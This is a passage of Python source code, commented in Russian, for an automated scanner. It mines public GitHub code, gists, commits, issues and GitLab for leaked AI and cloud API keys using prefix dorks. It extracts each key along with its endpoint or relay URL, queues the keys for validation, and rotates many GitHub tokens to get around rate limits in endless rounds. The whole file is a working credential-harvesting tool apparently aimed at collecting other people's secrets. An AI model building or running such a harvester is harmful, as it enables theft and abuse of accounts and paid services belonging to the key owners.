            doc_indicators = ['docs', 'settings', 'ref/', 'guide', 'tutorial', 'help']
            if any(ind in path.lower() for ind in doc_indicators):
                return False

        except Exception as e:
            logger.debug(f"Ошибка: {type(e).__name__}")

        return True
    
    # Домены, которые должны присутствовать в base_url для каждой платформы.
    # Если URL из контекста не содержит домен платформы — игнорируем его
    # (например, Gemini ключ AIzaSy... рядом с Google Places URL не делает
    # Places URL базовым эндпоинтом).
    PLATFORM_DOMAINS: Dict[str, str] = {
        "gemini": "googleapis.com",
        "anthropic": "anthropic.com",
        "huggingface": "huggingface.co",
        "groq": "groq.com",
        "deepseek": "deepseek.com",
        "cohere": "cohere.com",
        "mistral": "mistral.ai",
        "together": "together.ai",
        "replicate": "replicate.com",
        "perplexity": "perplexity.ai",
        "fireworks": "fireworks.ai",
        "xai": "x.ai",
        "openrouter": "openrouter.ai",
        "cerebras": "cerebras.ai",
        # Расширенный каталог — синхронизировано с EXTRA_PROVIDERS (config.py)
        "elevenlabs": "elevenlabs.io",
        "stability": "stability.ai",
        "heygen": "heygen.com",
        "runway": "runwayml.com",
        "tavily": "tavily.com",
        "firecrawl": "firecrawl.dev",
        "apify": "apify.com",
        "promptlayer": "promptlayer.com",
        "langfuse": "langfuse.com",
        "astra": "datastax.com",
        "sourcegraph": "sourcegraph.com",
        "wordware": "wordware.ai",
        "llamacloud": "llamaindex.ai",
    }

    def _extract_base_url(self, context: str, platform: str) -> tuple:
        """
        Извлекает Base URL из контекста.

        Для не-OpenAI платформ base_url должен содержать домен этой платформы,
        иначе любой случайный URL из контекста (Google Places, supabase и т.п.)
        будет ошибочно принят за relay-эндпоинт.

        Returns:
            (url, is_relay)
        """
        found_urls = []

        for pattern in self._base_url_patterns:
            for match in pattern.finditer(context):
                url = match.group(1) if match.lastindex else match.group(0)
                url = url.strip().rstrip('/"\'')

                if not url.startswith('http'):
                    continue
                if 'github.com' in url or 'githubusercontent' in url:
                    continue
                if len(url) < 10:
                    continue

                if not self._is_valid_relay_url(url):
                    continue

                url_lower = url.lower()

                # Для не-OpenAI платформ: URL должен содержать домен платформы
                # ИЛИ быть relay-эндпоинтом (myclaudehehe.cc и т.п. — нестандартный
                # домен, но ключ anthropic/gemini рядом с ним = relay-провайдер).
                # Раньше такие URL отбрасывались → ключ терял реальный эндпоинт.
                required_domain = self.PLATFORM_DOMAINS.get(platform)
                if required_domain and required_domain not in url_lower:
                    # URL не содержит родной домен — но это может быть relay.
                    # Проверяем: есть ли в URL API-признаки (/v1, /chat, api., /models)
                    api_indicators = ['/v1', '/chat', 'api.', '/models',
                                      '/openai', '/completions', '/messages']
                    is_relay_candidate = any(ind in url_lower
                                             for ind in api_indicators)
                    if not is_relay_candidate:
                        continue  # точно не API-эндпоинт

                # Вычисление приоритета
                priority = 0

                for relay_domain in KNOWN_RELAY_DOMAINS:
                    if relay_domain in url_lower:
                        priority += 5
                        break

                for keyword in URL_PRIORITY_KEYWORDS:
                    if keyword in url_lower:
                        priority += 1

                found_urls.append((url, priority))

        if found_urls:
            found_urls.sort(key=lambda x: x[1], reverse=True)
            best_url = found_urls[0][0]
            # Единая нормализация: срезать /chat/completions, /models,
            # сохранить /v1 или /api/v1, canonicalize известных доменов.
            best_url = normalize_base_url(best_url).rstrip('/')
            is_relay = ('openai.com' not in best_url
                        and 'azure.com' not in best_url
                        and 'googleapis.com' not in best_url
                        and 'anthropic.com' not in best_url
                        and 'huggingface.co' not in best_url
                        and 'deepseek.com' not in best_url
                        and 'mistral.ai' not in best_url
                        and 'together.ai' not in best_url
                        and 'perplexity.ai' not in best_url
                        and 'fireworks.ai' not in best_url
                        and 'x.ai' not in best_url
                        and 'cohere.com' not in best_url
                        and 'groq.com' not in best_url
                        and 'elevenlabs.io' not in best_url
                        and 'replicate.com' not in best_url
                        and 'siliconflow.cn' not in best_url
                        and 'moonshot.cn' not in best_url
                        and 'openrouter.ai' not in best_url
                        and 'cerebras.ai' not in best_url
                        and 'dashscope.aliyuncs.com' not in best_url
                        and 'volces.com' not in best_url
                        and 'bigmodel.cn' not in best_url
                        and 'voyageai.com' not in best_url
                        and 'jina.ai' not in best_url
                        and 'lepton.ai' not in best_url)

            return best_url, is_relay

        return config.default_base_urls.get(platform, ""), False
    
    def _extract_keys_from_content(self, content: str, source_url: str) -> List[ScanResult]:
        """
        Извлекает ключи из содержимого кода
        
        Оптимизация: предварительная фильтрация
        1. Сначала проверка кэша памяти (самое быстрое)
        2. Затем проверка базы данных (заблаговременное отбрасывание ключей, уже находящихся в БД, снижает нагрузку на очередь проверок)
        """
        results = []
        
        for platform, pattern in self._key_patterns.items():
            if platform == "azure":
                continue
            
            for match in pattern.finditer(content):
                api_key = match.group(0)
                
                # ========== Оптимизация: предварительная фильтрация ==========
                # 1. Проверка кэша памяти + БД (включает key_exists)
                if self._is_key_processed(api_key):
                    continue

                # Проверка фильтрации
                should_skip, reason = self._should_skip_key(api_key)
                if should_skip:
                    self._mark_key_processed(api_key)
                    self.stats["skipped_entropy"] += 1
                    if self.dashboard:
                        self.dashboard.increment_stat("skipped_low_entropy")
                    self._log(_slog_i18n("log_skip_key", key=mask_key(api_key), reason=reason), "SKIP")
                    continue

                # Извлечение контекста
                context = self._extract_context(content, match.start())
                # 40-char AWS secret без контекста — обычный base64/мусор
                # (старый lookahead ловил README-заглушки и дал 469k rows).
                if platform in ("aws_secret_key", "aws_secret"):
                    ctx_low = context.lower()
                    if not any(word in ctx_low for word in (
                        "aws_secret_access_key", "aws_secret_key",
                        "aws_secret", "secret_access_key", "secret key",
                        "access_key", "aws_access")):
                        self._mark_key_processed(api_key)
                        continue

                # Проверка Azure
                is_azure = self._is_azure_context(context)

                if is_azure:
                    azure_endpoint = self._extract_azure_endpoint(context)
                    base_url = azure_endpoint or ""
                    actual_platform = "azure"
                    is_relay = False
                else:
                    base_url, is_relay = self._extract_base_url(context, platform)

                    actual_platform = (
                        "opencode_zen"
                        if "opencode.ai" in (base_url or "").lower()
                        else ("relay" if is_relay else platform)
                    )
                should_skip_url, url_reason = self._should_skip_url(base_url)
                if should_skip_url:
                    self._mark_key_processed(api_key)
                    self.stats["skipped_blacklist"] += 1
                    if self.dashboard:
                        self.dashboard.increment_stat("skipped_blacklist")
                    self._log(_slog_i18n("log_skip_url", key=mask_key(api_key), reason=url_reason), "SKIP")
                    continue
                
                results.append(ScanResult(
                    platform=actual_platform,
                    api_key=api_key,
                    base_url=base_url,
                    source_url=source_url,
                    is_azure=is_azure,
                    is_relay=is_relay,
                    context=context
                ))
                
                self._mark_key_processed(api_key)
        
        return results
    
    # ========================================================================
    #                           Логика поиска
    # ========================================================================
    
    def _handle_rate_limit(self) -> bool:
        """Обработка ограничения частоты запросов.

        Оптимизация: перебирает ВСЕ токены в поисках с квотой,
        вместо ротации на один и сна если тот тоже исчерпан.
        """
        try:
            if len(self._github_clients) > 1:
                # Перебрать все токены, найти первый с remaining > 0
                for _ in range(len(self._github_clients)):
                    self._rotate_client()
                    client = self._get_github_client()
                    try:
                        rate_limit = client.get_rate_limit()
                        if rate_limit.search.remaining > 0:
                            return True
                    except Exception:
                        continue
                # Все токены исчерпаны — выйти из цикла и ждать reset

            client = self._get_github_client()
            rate_limit = client.get_rate_limit()
            
            if rate_limit.search.remaining == 0:
                reset_time = rate_limit.search.reset
                now = datetime.now(timezone.utc)
                sleep_seconds = (reset_time - now).total_seconds() + 5
                
                if sleep_seconds > 0:
                    self._log(_slog_i18n("log_tokens_exhausted", s=sleep_seconds), "WARN")
                    while sleep_seconds > 0 and not self.stop_event.is_set():
                        time.sleep(min(10, sleep_seconds))
                        sleep_seconds -= 10
            return True
        except Exception as e:
            self._rotate_client()
            time.sleep(3)
            return True
    
    def search_keyword(self, keyword: str) -> Optional[int]:
        """
        Поиск по одному ключевому слову

        Оптимизация: используется aiohttp для асинхронной пакетной загрузки содержимого файлов, значительно увеличивая скорость
        """
        found_count = 0
        
        if self.dashboard:
            self.dashboard.update_stats(
                current_keyword=keyword,
                current_token_index=self._current_client_index,
                total_tokens=len(self._github_clients)
            )
        
        try:
            try:
                from tui_i18n import tf as _i18n_tf, resolve_lang as _i18n_lang
                _lg = _i18n_lang()
                self._log(_i18n_tf("log_searching", _lg, kw=keyword), "SCAN")
                logger.debug(_i18n_tf("log_search_kw", _lg, kw=keyword))
            except Exception:
                self._log(f'Search "{keyword}"...', "SCAN")
                logger.debug(f"Search: {keyword}")

            # GitHub dorks: no extra in:file when already present
            query = keyword if any(x in keyword for x in ['filename:', 'path:', 'language:', 'is:', 'repo:']) else f"{keyword} in:file"
            client = self._get_github_client()
            try:
                from tui_i18n import tf as _i18n_tf, resolve_lang as _i18n_lang
                logger.debug(_i18n_tf("log_github_api_query", _i18n_lang(), q=query))
            except Exception:
                logger.debug(f"GitHub API query: {query}")
            code_results = client.search_code(query)
            
            # ========== Оптимизация: пакетный сбор метаданных файлов + многоуровневая фильтрация ==========
            # Размер пакета снижен с 50 до 40 для уменьшения блокировки «длинного хвоста»
            batch_size = 40
            files_batch = []
            total_results = 0
            skipped_sha = 0
            skipped_filter = 0
            
            for i, code_file in enumerate(code_results):
                total_results = i + 1
                if self.stop_event.is_set():
                    break
                
                # Skip detection: if first 30 results are all SHA-skipped, skip query
                # (увеличено с 10 до 30 — 10 было слишком агрессивно, пропускали
                # ключи в файлах дальше в выдаче)
                if total_results <= 30 and skipped_sha == total_results:
                    if total_results == 30:
                        logger.debug(f"Skip '{keyword}': first 30 results already scanned")
                        self._log(f"Skip '{keyword}' (all scanned)", "SKIP")
                        break
                
                # Логирование прогресса каждые 50 результатов
                if total_results % 50 == 0:
                    logger.debug(f"Прогресс '{keyword}': обработано {total_results} результатов, пропущено SHA: {skipped_sha}")
                    self._log(_slog_i18n("log_processed_results", n=total_results, skip=skipped_sha), "SCAN")
                
                try:
                    # ===== 1. Дедупликация по SHA - проверяется в первую очередь, пропускает уже отсканированные файлы =====
                    file_sha = getattr(code_file, 'sha', None)
                    if file_sha and self._is_sha_processed(file_sha):
                        self.stats["skipped_sha"] += 1
                        skipped_sha += 1
                        continue
                    
                    # ===== 2. Фильтрация по пути/размеру файла =====
                    file_path = getattr(code_file, 'path', '') or ''
                    file_size = getattr(code_file, 'size', 0) or 0
                    
                    skip_file, skip_reason = should_skip_file(file_path, file_size)
                    if skip_file:
                        self.stats["skipped_file_filter"] += 1
                        if file_sha:
                            self._mark_sha_processed(file_sha)  # Отмечаем как обработанный, чтобы не проверять снова
                        continue
                    
                    # ===== 3. Получение URL для загрузки =====
                    raw_url = code_file.download_url
                    html_url = code_file.html_url
                    
                    # Отмечаем SHA как обработанный
                    if file_sha:
                        self._mark_sha_processed(file_sha)
                    
                    if raw_url:
                        files_batch.append((raw_url, html_url, code_file))
                    else:
                        # Нет raw_url, возврат к API PyGitHub
                        try:
                            content = code_file.decoded_content.decode('utf-8', errors='ignore')
                            found_count += self._process_downloaded_file(html_url, content)
                        except Exception as e:
                            logger.debug(f"Ошибка: {type(e).__name__}")
                    
                    # Достигнут размер пакета, запуск асинхронной загрузки
                    if len(files_batch) >= batch_size:
                        found_count += self._process_file_batch(files_batch)
                        files_batch = []
                        self._rotate_client()
                        if self.dashboard:
                            self.dashboard.update_stats(current_token_index=self._current_client_index)
                    
                except Exception as e:
                    logger.debug(f"Ошибка сканирования: {type(e).__name__}: {e}")
                    continue
            
            # Обработка оставшихся файлов
            if files_batch and not self.stop_event.is_set():
                found_count += self._process_file_batch(files_batch)

            if self.stop_event.is_set():
                return None

            logger.debug(f"Результат поиска '{keyword}': найдено {total_results} результатов, пропущено SHA: {skipped_sha}, фильтров: {skipped_filter}, ключей: {found_count}")
            self.db.mark_keyword_scanned(keyword, result_count=total_results, fully_scanned=True)
            return found_count

        except RateLimitExceededException:
            self._log(_slog_i18n("log_rate_limit"), "WARN")
            self._handle_rate_limit()
        except GithubException as e:
            msg = str(e).lower()
            if "rate limit" in msg:
                self._handle_rate_limit()
            elif "401" in msg or "bad credentials" in msg:
                # Токен мёртв — баним, чтобы не ротировать на него вечно.
                try:
                    self._bad_token(self._github_clients[
                        self._current_client_index % len(self._github_clients)
                    ].oauth_token)
                except Exception:
                    pass
                if len(self._bad_github_tokens) >= len(self._github_clients):
                    self._log(_slog_i18n("log_all_tokens_dead"), "ERROR")
                    return None
                self._rotate_client()
            else:
                self._log(_slog_i18n("log_api_error", err=str(e)[:30]), "ERROR")
                self._rotate_client()
        except Exception as e:
            self._log(_slog_i18n("log_search_error", err=str(e)[:30]), "ERROR")
            self._rotate_client()

        return None
    
    def _process_file_batch(self, files_batch: List[Tuple[str, str, any]]) -> int:
        """
        Асинхронная пакетная обработка файлов
        
        Args:
            files_batch: [(raw_url, html_url, code_file), ...]
            
        Returns:
            Количество найденных ключей
        """
        found_count = 0
        
        # Асинхронная пакетная загрузка
        downloaded_files = self._run_async_download(files_batch)
        
        # Обработка загруженных файлов
        for html_url, content, code_file in downloaded_files:
            found_count += self._process_downloaded_file(html_url, content)
        
        # Для файлов, не загруженных успешно, возврат к API PyGitHub
        downloaded_urls = {item[0] for item in downloaded_files}
        for raw_url, html_url, code_file in files_batch:
            if html_url not in downloaded_urls:
                try:
                    content = code_file.decoded_content.decode('utf-8', errors='ignore')
                    found_count += self._process_downloaded_file(html_url, content)
                except Exception as e:
                    logger.debug(f"Ошибка: {type(e).__name__}")
        
        return found_count
    
    def _process_downloaded_file(self, source_url: str, content: str) -> int:
        """
        Обработка одного загруженного файла
        
        Args:
            source_url: URL источника файла
            content: Содержимое файла
            
        Returns:
            Количество найденных ключей
        """
        found_count = 0
        
        self.stats["files_scanned"] += 1
        if self.dashboard:
            self.dashboard.increment_stat("total_scanned")
        
        # Извлечение ключей
        results = self._extract_keys_from_content(content, source_url)
        
        for result in results:
            try:
                self.result_queue.put(result, timeout=5)
            except Exception as e:
                logger.debug(f"Ошибка: {type(e).__name__}")
                continue
            found_count += 1
            self.stats["total_found"] += 1

            if self.dashboard:
                self.dashboard.increment_stat("total_keys_found")
                self.dashboard.add_log(
                    f"Найден {result.platform.upper()} ключ: {mask_key(result.api_key)}",
                    "FOUND"
                )
        
        return found_count

    def _extended_search_phase(self, keywords: list):
        """Фаза расширенного поиска после завершения основного прогона."""
        import asyncio
        high_yield = [k for k in keywords if any(x in k.lower() for x in
                     ['sk-proj-','sk-ant-','AIza','sk-or-v1-','gsk_','pplx-',
                      'xai-','hf_','OPENAI_API_KEY','ANTHROPIC_API_KEY',
                      'csk-','MISTRAL_API','TOGETHER_API','COHERE_API',
                      'FIREWORKS_API','REPLICATE_API','DEEPSEEK_API',
                      'GROQ_API','XAI_API','OPENROUTER_API','CEREBRAS_API',
                      'RUNPOD_API','SILICONFLOW_API','DASHSCOPE_API',
                      'MOONSHOT_API','LITELLM','proxy_config','gateway_config',
                      'tvly-','fc-','apify_api_','sk-lf-','sgp_','ww_',
                      'docker-compose','secret.yaml','settings.py','constants.py'])]
        if not high_yield:
            return
        async def _run():
            # GitHub Gists/Commits/Issues
            try:
                from extended_search import GistSearcher
                s = GistSearcher(config.github_tokens)
                sem = asyncio.Semaphore(3)
                async def _gh_search(dork):
                    async with sem:
                        g = await s.search_gists(dork)
                        c = await s.search_commits(dork)
                        i = await s.search_issues(dork)
                        if g or c or i:
                            self._log(f"GH: {dork[:30]}... g:{len(g)} c:{len(c)} i:{len(i)}", "SCAN")
                        await asyncio.sleep(1.5)
                tasks = [_gh_search(d) for d in high_yield[:8]]
                await asyncio.gather(*tasks)
                await s.close()
            except Exception:
                pass

            # GitLab Code Search
            try:
                from gitlab_searcher import GitLabSearcher
                gl = GitLabSearcher()
                gl_sem = asyncio.Semaphore(2)
                async def _gl_search(dork):
                    async with gl_sem:
                        r = await gl.search_code(dork)
                        if r:
                            self._log(f"GL: {dork[:30]}... {len(r)} файлов", "SCAN")
                tasks = [_gl_search(d) for d in high_yield[:6]]
                await asyncio.gather(*tasks)
                await gl.close()
            except Exception:
                pass

        asyncio.run(_run())

    def run(self, resume: bool = True):
        """
        Запуск основного цикла сканера
        
        Args:
            resume: Возобновление с точки останова
        """
        round_num = 0
        keywords = config.search_keywords
        total_keywords = len(keywords)
        self.db.safe_upsert_source_progress(
            "github", status="running", phase="search", current=0,
            total=total_keywords, message="",
        )
        
        # Возобновление с точки останова: загрузка предыдущего прогресса
        start_index = 0
        if resume:
            progress = self.db.load_progress()
            if progress["total"] == total_keywords and not progress["is_completed"]:
                start_index = progress["current_index"]
                self._log(_slog_i18n("log_resume_checkpoint", cur=start_index + 1, total=total_keywords), "INFO")
            else:
                self._log(_slog_i18n("log_no_checkpoint"), "INFO")
        
        while not self.stop_event.is_set():
            round_num += 1
            last_i = start_index  # последний обработанный index

            for i, keyword in enumerate(keywords):
                if self.stop_event.is_set():
                    break

                # Возобновление с точки останова: пропуск завершённых (1-й раунд)
                if round_num == 1 and i < start_index:
                    continue

                # Пропуск уже полностью просканированных keywords (на 2+ раундах)
                if round_num > 1 and self.db.is_keyword_scanned(keyword, max_age_hours=24):
                    continue

                self.db.safe_upsert_source_progress(
                    "github", status="running", phase="search",
                    current=last_i, total=total_keywords,
                    message=f"keyword {i + 1}/{total_keywords}",
                )
                found = self.search_keyword(keyword)
                self._rotate_client()
                if self.stop_event.is_set():
                    self.db.safe_upsert_source_progress(
                        "github", status="stopped", phase="stopped",
                        current=last_i, total=total_keywords, message="",
                    )
                    break
                # Ошибка keyword (None) = 0 found. Не break — идём дальше,
                # но ОБЯЗАТЕЛЬНО продвигаем last_i, иначе при
                # битых токенах весь прогон «зависал» на
                # last_i и система писала «остановлен».
                if found is None:
                    found = 0
                    self.db.safe_upsert_source_progress(
                        "github", status="running", phase="search",
                        current=last_i, total=total_keywords,
                        message="keyword failed, next",
                        errors_increment=1,
                    )
                    self._rotate_client()
                    last_i = i + 1  # двигаемся вперёд для честного завершения прогона
                    self.db.save_progress(last_i, total_keywords,
                                         is_completed=(last_i == total_keywords))
                    continue

                last_i = i + 1
                self.db.safe_upsert_source_progress(
                    "github", status="running", phase="search",
                    current=last_i, total=total_keywords, message="",
                    processed_increment=1, found_increment=found,
                )

                # Сохранение прогресса (честный i+1)
                self.db.save_progress(
                    last_i, total_keywords,
                    is_completed=(last_i == total_keywords))

                # Без лишних пауз: GitHub сам rate-limit'ит, а при 403 ждём
                # ровно reset (см. _handle_rate_limit). Лишние sleep только
                # замедляют прогон без пользы.

            # Финальная отметка: реальный прогресс, completed только если прошли
            # все keywords (НЕ прыгать на 100% при прерывании/остановке).
            fully_done = (last_i >= total_keywords)
            self.db.save_progress(
                max(last_i, total_keywords if fully_done else last_i),
                total_keywords, is_completed=fully_done)
            self._log(
                f"Прогон {round_num} завершён: {last_i}/{total_keywords}"
                + ("" if fully_done else " (остановлен)"), "INFO")

            if not self.stop_event.is_set() and fully_done:
                # Авто-рестарт: сброс прогресса и новый прогон
                self._log(_slog_i18n("log_auto_restart"), "INFO")
                self.db.reset_progress()
                round_num += 1
                start_index = 0
                continue
            # Все GitHub-токены отбракованы (401)? Не выходим навсегда —
            # делаем паузу и повторяем раунд (вдруг могут
            # появиться валидные токены в config.github_tokens).
            if not self.stop_event.is_set() and self._all_tokens_bad():
                self._log(_slog_i18n("log_tokens_pause"), "WARN")
                for _ in range(60):
                    if self.stop_event.is_set():
                        break
                    time.sleep(1)
                if not self.stop_event.is_set():
                    self.db.reset_progress()
                    round_num += 1
                    start_index = 0
                    continue
            # Остановлен пользователем — выходим
            break

        # Flush остатков SHA batch buffer в БД
        with self._sha_lock:
            remaining = self._sha_batch_buffer[:]
            self._sha_batch_buffer.clear()
        if remaining:
            try:
                self.db.mark_blobs_scanned_batch(remaining)
            except Exception:
                pass
        self.db.safe_upsert_source_progress("github", status="stopped", phase="stopped")


def start_scanner(
    result_queue: queue.Queue,
    db: Database,
    stop_event: threading.Event,
    dashboard = None,
    resume: bool = True
) -> threading.Thread:
    """
    Запуск потока сканера
    
    Args:
        resume: Возобновление с точки останова
    """
    from loguru import logger as _log
    scanner = GitHubScanner(result_queue, db, stop_event, dashboard)

    def _safe_run():
        while not stop_event.is_set():
            try:
                scanner.run(resume=resume)
            except Exception as exc:
                db.safe_upsert_source_progress(
                    "github", status="error", phase="error",
                    message=type(exc).__name__, errors_increment=1,
                )
                _log.exception("Scanner thread crashed")
                if dashboard:
                    dashboard.add_log("Scanner thread crashed — see scanner.log for details", "ERROR")
            # Чистый выход run() — не убиваем сканер навсегда.
            # Ждём паузу перед повтором раунда.
            if stop_event.is_set():
                break
            if dashboard:
                dashboard.add_log("GitHub scanner restart (cooldown 15s)...", "WARN")
            for _ in range(15):
                if stop_event.is_set():
                    break
                time.sleep(1)
            if stop_event.is_set():
                break
            # scanner создаётся один раз вне цикла (см. выше) — не
            # переназначаем, иначе UnboundLocalError на первой итерации.

    thread = threading.Thread(target=_safe_run, name="GitHubScanner", daemon=True)
    thread.start()
    
    # Параллельная нить: расширенный поиск (Gists, Commits, GitLab)
    _start_extended_searcher(result_queue, db, stop_event, dashboard)
    
    return thread


def _start_extended_searcher(result_queue, db, stop_event, dashboard=None):
    """Запустить параллельный расширенный поиск (gists/commits/gitlab)."""
    import asyncio
    import time

    TOPLIST = ["sk-proj-", "sk-ant-", "AIza", "OPENAI_API_KEY",
               "ANTHROPIC_API_KEY", "sk-or-v1-", "gsk_", "pplx-",
               "xai-", "csk-", "hf_", "MISTRAL_API_KEY",
               "DEEPSEEK_API_KEY", "GROQ_API_KEY", "CEREBRAS_API_KEY",
               "LITELLM_MASTER_KEY", "OPENROUTER_API_KEY"]

    async def _round():
        from extended_search import GistSearcher
        from key_extractor import KeyExtractor
        s = GistSearcher(config.github_tokens)
        kx = KeyExtractor()
        sem = asyncio.Semaphore(2)
        
        async def _search(dork):
            async with sem:
                # 1. Поиск
                g = await s.search_gists(dork)
                c = await s.search_commits(dork)
                i = await s.search_issues(dork)
                
                # 2. Загрузка и экстракция ключей
                found = []
                if g:
                    found.extend(await kx.process_gists(g[:10]))
                if c:
                    found.extend(await kx.process_commits(c[:10]))
                if i:
                    for item in i[:5]:  # issues — только заголовки и тело, скачиваем body
                        if item.get("body"):
                            body = item["body"]
                            found.extend(await kx.fetch_and_extract(item["url"]))
                        await asyncio.sleep(0.2)
                
                # 3. Отправка найденных ключей в очередь валидации
                queued = 0
                for key_data in found:
                    if stop_event.is_set():
                        break
                    result = ScanResult(
                        platform=key_data["platform"],
                        api_key=key_data["api_key"],
                        base_url=key_data.get("base_url", ""),
                        source_url=key_data.get("source_url", ""),
                        is_relay=False,
                        is_azure=(key_data["platform"] == "azure"),
                    )
                    try:
                        result_queue.put(result, timeout=3)
                        queued += 1
                    except Exception:
                        break
                
                if queued or g or c or i:
                    msg = f"ExtendedSearch: {dork[:25]} g:{len(g)} c:{len(c)} i:{len(i)} → ключей: {len(found)} (в очередь: {queued})"
                    logger.info(msg)
                    if dashboard:
                        dashboard.add_log(msg, "INFO")
                await asyncio.sleep(2)
        
        tasks = [_search(d) for d in TOPLIST[:6]]
        await asyncio.gather(*tasks)
        await s.close()
        await kx.close()

        # GitLab
        try:
            from gitlab_searcher import GitLabSearcher
            gl = GitLabSearcher()
            for dork in TOPLIST[:3]:
                r = await gl.search_code(dork)
                if r:
                    # GitLab results — fetch raw files and extract
                    for item in r[:5]:
                        raw_url = item.get("url", "")
                        if raw_url:
                            raw_url = raw_url.replace("/blob/", "/-/raw/")
                            keys = await kx.fetch_and_extract(raw_url)
                            for key_data in keys:
                                result = ScanResult(
                                    platform=key_data["platform"],
                                    api_key=key_data["api_key"],
                                    base_url=key_data.get("base_url", ""),
                                    source_url=key_data.get("source_url", ""),
                                    is_relay=False,
                                    is_azure=(key_data["platform"] == "azure"),
                                )
                                try:
                                    result_queue.put(result, timeout=3)
                                except Exception:
                                    break
                    msg = f"ExtendedSearch GitLab: {dork} → {len(r)} файлов"
                    logger.info(msg)
                    if dashboard:
                        dashboard.add_log(msg, "INFO")
                await asyncio.sleep(2)
            await gl.close()
        except Exception:
            pass

    def _loop():
        while not stop_event.is_set():
            try:
                asyncio.run(_round())
            except Exception as e:
                logger.debug(f"ExtendedSearch error: {e}")
            # Пауза между раундами 5 мин
            for _ in range(300):
                if stop_event.is_set():
                    break
                time.sleep(1)

    t = threading.Thread(target=_loop, name="ExtendedSearch", daemon=True)
    t.start()
    return t
